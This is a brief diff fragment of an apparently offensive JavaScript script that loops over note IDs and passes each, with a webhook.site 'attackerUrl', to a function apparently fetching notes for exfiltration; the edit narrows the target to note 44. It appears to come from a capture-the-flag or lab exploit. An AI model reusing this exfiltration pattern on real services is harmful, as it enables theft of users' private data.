@@ -19,7 +19,8 @@ async function getNoteById(id, attackerUrl) {
 (async () => {
   const attackerUrl =
     "https://webhook.site/6963216e-50eb-47fa-a44d-5e6484b168fd";
-  let noteIds = await getNotes();
+  // let noteIds = await getNotes();
+  let noteIds = [44];
   for (let id of noteIds) {
     await getNoteById(id, attackerUrl);
   }
